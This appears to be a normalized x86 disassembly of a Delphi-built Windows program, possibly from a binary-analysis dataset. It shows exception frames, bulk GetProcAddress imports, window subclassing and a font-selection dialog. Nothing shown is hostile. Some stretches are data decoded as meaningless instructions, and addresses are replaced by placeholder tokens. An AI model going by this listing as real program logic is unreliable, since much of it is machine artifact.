dec [ ebx - 0x31d7f2d ]
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
mov eax esi
call sub_403118
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
sub_426044
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_426084
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_4260dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426101
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426108
retn
sub_426114
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_4260cc
xor eax eax
push ebp
push sub_4262cb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4262d2
mov eax [ rw-data ]
call sub_4260d4
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_4262d4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_4260cc
xor eax eax
push ebp
push sub_426687
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42668e
mov eax [ rw-data ]
call sub_4260d4
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_426a38
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_426a60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426aa8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426aaf
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403128
call sub_426114
cmp [ rw-data ] 0x0
jg r-xdata
sub_426ad0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426af5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426afc
retn
sub_426b08
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426b2d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426b34
retn
sub_426b40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426b65
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426b6c
retn
sub_426b78
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426b9d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426ba4
retn
sub_426bb0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426bd5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426bdc
retn
sub_426be8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426c0d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c14
retn
sub_426c20
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426c45
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c4c
retn
sub_426c60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426c85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c8c
retn
sub_426c98
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426cbd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426cc4
retn
sub_426cd4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
insd
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp * 2 + 0x42 ] bl
add [ ebp + ebp * 2 + 0x42 ] bh
add [ eax ] bl
add [ eax ] al
test [ ecx ] ah
inc ecx
add al ah
cdq
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add [ ebx + esi + 0x73380040 ] al
inc edx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bl
jb r-xdata
add [ edx ] al
add [ eax ] dl
add [ eax + 0x3f ] bl
inc ecx
add al ch
xchg ebp eax
inc ecx
add [ esi + edi + 0x41 ] dh
add al al
xchg esi eax
inc ecx
add [ ebp + edx * 4 - 0x692fffbf ] cl
inc ecx
add al cl
xchg edi eax
inc ecx
add al bh
cdq
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0x72940041 0x42
mov esp 0x10004273
jae r-xdata
insb
outsd
jae r-xdata
add ah bl
jae r-xdata
insd
add [ eax ] cl
je r-xdata
add al [ eax ]
add eax 0x336c7443
inc esp
pushad
cmovno eax [ eax ]
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
add [ eax ] dh
add [ eax ] al
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
adc [ eax ] al
xor [ eax ] al
add al 0x0
add [ eax ] dl
add ah dh
jae r-xdata
dec edi
outsb
push ebx
push 0x6e40776f
inc edx
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] edx
outsb
je r-xdata
outsd
outsb
je r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0x6d1c676f
inc edx
add [ eax + 0x6004122 ] al
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x473676f
add [ edx - 0x11001100 ] eax
inc esp
jae r-xdata
add [ eax ] ch
sub [ eax ] eax
add eax 0x10000200
inc eax
add ah bl
je r-xdata
push eax
imul esi [ ebx + 0x68 ] 0x796c6e4f
adc [ esi + 0x64 ] ah
inc esi
imul esp [ ecx + 0x6c ] 0x704f676f
je r-xdata
cmp al 0x6e
js r-xdata
add bh bh
xor [ eax ] al
add al dh
je r-xdata
dec eax
insb
inc esi
outsd
outsb
je r-xdata
inc esi
outsd
outsb
je r-xdata
inc edx
add [ edx ] cl
inc cx
outsb
jae r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ esi + ebp * 2 ] bh
dec si
outsd
push ebx
imul edi [ edx + 0x65 ] 0xc6c6553
dec si
dec edi
outsb
insb
jns r-xdata
push esp
int3
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
insd
outsd
outsb
add [ 0x6d6f4354 ] cl
insd
outsd
outsb
inc esp
imul esp [ ecx + 0x6c ] 0xc08b676f
nop
insd
inc edx
add [ edi ] al
or eax 0x6d6f4354
or esp [ esi + 0x64 ]
push di
jns r-xdata
insb
js r-xdata
je r-xdata
pcmpgtd mm4 [ esi + ecx * 2 + 0x6f ]
push ebx
imul ebp [ ebp + 0x75 ] 0x6974616c
outsd
outsb
jae r-xdata
add [ ebp + 0x6f640040 ] cl
inc edx
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] edx
outsb
je r-xdata
pcmpgtd mm4 [ esi + ecx * 2 + 0x6f ]
push esi
arpl [ gs : edi + ebp * 2 + 0x72 ] si
inc esi
outsd
outsb
je r-xdata
insb
push ebx
or [ esi + 0x64 ] esp
inc ebp
jb r-xdata
push sp
insb
push esp
jns r-xdata
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x8b73676f
rol [ edi + ebp * 2 + 0x42 ] 0x0
push es
adc dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
inc cx
jo r-xdata
add al [ eax ]
add [ eax ] al
pushad
outsd
inc edx
add [ eax ] cl
push bx
arpl [ edx + 0x65 ] si
outsb
or [ esi + 0x64 ] esp
dec esp
imul ebp [ ebp + 0x69 ] 0x7a695374
push cs
imul esi [ edi + 0x79 ] 0x64660b67
inc esp
jo r-xdata
or ah [ esi + 0x64 ]
push ebx
push 0x6548776f
insb
jae r-xdata
lodsb [ esi ]
outsd
inc edx
add [ eax ] cl
or eax 0x41444654
outsd
outsd
push ebx
je r-xdata
or al 0x66
dec esi
jo r-xdata
inc esp
inc ecx
imul esp [ ecx + 0x6c ] 0x6544676f
or esp [ esi + 0x64 ]
dec esi
outsd
inc esi
popad
arpl [ ebp + 0x53 ] sp
insb
or al 0x66
dec esi
outsd
dec edi
inc ebp
dec ebp
outsd
jb r-xdata
inc si
push ebx
dec edi
outsb
insb
jns r-xdata
push eax
jb r-xdata
imul esp [ ecx + 0x6c ] 0x704f676f
je r-xdata
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x8b73676f
insb
jns r-xdata
insb
jo r-xdata
outsb
je r-xdata
inc eax
add [ eax + esi * 2 ] ch
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 2 + 0x42 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ ebp + 0x1 ] sp
add [ eax ] al
add [ eax ] al
push bx
arpl [ ecx + 0x6c ] sp
popad
bound ebp [ ebp + 0x4f ]
outsb
insb
jns r-xdata
fdiv [ eax ]
inc eax
add [ ebp + esi * 2 + 0x3f580042 ] bl
inc ecx
add al ch
xchg ebp eax
inc ecx
add [ esi + edi + 0x41 ] dh
add al al
xchg esi eax
inc ecx
add [ ebp + edx * 4 - 0x692fffbf ] cl
insb
jns r-xdata
imul edi [ eax + 0x65 ] 0x74695064
arpl [ eax + 0x4f ] bp
outsb
insb
jns r-xdata
adc [ esi + 0x64 ] ah
inc esi
arpl [ gs : ebx + esi * 2 + 0x10 ] si
inc si
inc bp
push es
push ebx
outsb
jb r-xdata
outsd
outsb
jae r-xdata
jbe r-xdata
jne r-xdata
inc ecx
add al cl
xchg edi eax
inc ecx
add al bh
cdq
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0x75480041 0x42
int3
xchg esi eax
add [ eax + esi * 2 + 0x42 ] dh
add [ eax + eax ] dh
add al dl
insb
inc edx
add al ah
cdq
add [ eax + esi * 2 + 0x42 ] ch
jb r-xdata
jbe r-xdata
add [ ebx ] al
push edi
outsb
add al 0x48
push edi
dec esi
inc esp
add ah dh
adc [ eax ] al
and al 0x5d
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x3 ] si
cmp al 0x6e
inc edx
shr [ edi + ebp * 2 + 0xd080042 ] 0x54
inc esi
je r-xdata
inc dx
outsd
je r-xdata
inc edx
add al al
xor [ eax ] al
outsb
je r-xdata
jae r-xdata
outsb
add [ eax ] al
shr [ edx + eax * 2 ] 0x1
loopne r-xdata
add cl [ eax ]
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add [ ebx + esi + 0x73380040 ] al
sub_427178
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_453044
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_44f5e4
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_44f5e4
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_452d48
mov edi eax
mov eax ebx
call sub_452d2c
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_452d14
mov edi eax
mov eax ebx
call sub_452d60
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_42722c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_427178
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_427294
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419270
mov [ esi + 0x30 ] 0x1
push esi
push sub_427370
call sub_41a300
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_4272dc
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4192bc
test bl bl
jle r-xdata
call sub_41a398
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_427310
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_455a38
mov cl 0x1
sub_427338
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_403378
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_427370
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42739a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_427408
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_44c338
mov [ ebp - 0x14 ] eax
call sub_44c254
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4274cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_455328
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_42749d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4274a4
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_455384
retn
sub_4274a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4274d2
mov eax [ ebp - 0x14 ]
call sub_44c3ec
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_44c25c
retn
sub_427504
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax 0x111
jne r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
push eax
push edx
call sub_42722c
cmp [ ebp + 0x10 ] 0x402
jne r-xdata
cmp [ ebp + 0x12 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_427618
mov eax 0x1
jmp r-xdata
pop ebp
retn 0x10
sub_427548
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_427294
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c388
mov [ esi + 0x58 ] eax
mov ax [ r-xdata ]
mov [ esi + 0x5d ] ax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_42759a
add [ eax ] al
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x58 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4272dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_4275cc
cmp [ edx ] 0x111
jne r-xdata
call sub_4273bc
retn
cmp [ edx + 0x6 ] 0x9
jne r-xdata
mov cx [ edx + 0x4 ]
cmp cx 0x473
jne r-xdata
cmp cx 0x474
jne r-xdata
mov [ eax + 0x71 ] 0x1
jmp r-xdata
mov [ eax + 0x70 ] 0x1
sub_427618
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x40 ]
push eax
push 0x0
push 0x401
push ebx
call SendMessageA
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_427880
push 0x0
push 0x0
push 0x147
push 0x473
push ebx
call SendDlgItemMessageA
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor eax eax
push ebp
push sub_4276a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffed
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0x0
push esi
push 0x150
push 0x473
push ebx
call SendDlgItemMessageA
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_41c55c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4276c4
push ebp
mov ebp esp
add esp 0xffffff7c
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x84 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42785d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x44 ] 0x3c
xor eax eax
mov [ ebp - 0x3c ] eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x80 ]
push eax
push 0x3c
mov eax [ ebx + 0x58 ]
call sub_41c570
push eax
call GetObjectA
lea eax [ ebp - 0x8 ]
lea edx [ ebp - 0x64 ]
mov ecx 0x20
call sub_4040e8
xor eax eax
mov al [ ebx + 0x5c ]
mov eax [ eax * 4 + rw-data ]
or eax 0x48
mov [ ebp - 0x30 ] eax
xor eax eax
mov esi rw-data
call sub_425bec
call sub_425738
mov [ ebp - 0x3c ] eax
jae r-xdata
and edx 0x7f
bt [ ebx + 0x5d ] edx
inc eax
add esi 0x4
cmp al 0x10
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x30 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
or [ ebp - 0x30 ] 0x200
mov eax [ ebx + 0x58 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] sub_427504
mov eax [ ebx + 0x68 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x6c ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x10 ]
jge r-xdata
or [ ebp - 0x30 ] 0x10
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x40 ] eax
mov esi [ rw-data ]
mov [ rw-data ] ebx
mov [ ebx + 0x71 ] 0x0
mov [ ebx + 0x70 ] 0x0
lea ecx [ ebp - 0x44 ]
mov edx ChooseFontA
mov eax ebx
mov edi [ eax ]
call [ edi + 0x38 ]
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
mov [ rw-data ] esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
and [ ebp - 0x30 ] 0xffffdfff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427864
lea eax [ ebp - 0x84 ]
call sub_403e78
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
lea eax [ ebp - 0x84 ]
lea edx [ ebp - 0x64 ]
mov ecx 0x20
call sub_4040e8
mov edx [ ebp - 0x84 ]
mov eax [ ebp - 0x8 ]
call sub_407c1c
test eax eax
je r-xdata
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_427880
cmp [ ebx + 0x71 ] 0x0
je r-xdata
mov [ ebx + 0x70 ] 0x1
